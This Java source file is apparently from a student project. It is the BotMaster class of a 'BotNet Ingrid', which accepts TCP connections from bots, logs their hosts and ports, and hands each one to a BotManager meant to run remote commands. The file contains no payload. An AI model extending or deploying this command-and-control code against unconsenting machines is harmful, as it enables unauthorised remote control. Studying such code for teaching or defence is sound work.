/*
 * Classe responsavel por gerenciar a BotNet Ingrid
 * Criar um servidor TCP, aguarda novas conexoes de bots
 * Lista bots disponiveis na rede
 * Permite executar comandos remotamente nos bots
 */
package edu.br.utfpr.projectingrid;

import edu.br.utfpr.projectingrid.Setup.Setup;
import java.io.IOException;
import java.net.ServerSocket;
import java.net.Socket;

/**
 *
 * @author Francisco Xavier 12/05/2018
 */
public class BotMaster {
    private static ServerSocket socket;
    public static void main(String args[]){
        try {
			socket = new ServerSocket(Setup.porta);
	} catch (IOException e1) {
			e1.printStackTrace();
	}
	
        System.out.println("BotMaster rodando na porta = "
				+ socket.getLocalPort());
	while (true) {
	    try {
		Socket conexao = socket.accept();
                System.out.println("Bot Connetado");
		System.out.println("HOSTNAME = " + conexao.getInetAddress().getHostName());
		System.out.println("HOST ADDRESS = " + conexao.getInetAddress().getHostAddress());
		System.out.println("PORTA LOCAL = " + conexao.getLocalPort());
                System.out.println("PORTA DE CONEXAO = " + conexao.getPort());
		System.out.println("======================================");
                
		new BotManager(conexao).start();
			} catch (IOException e) {
				e.printStackTrace();
			}

		}
    }
    
}
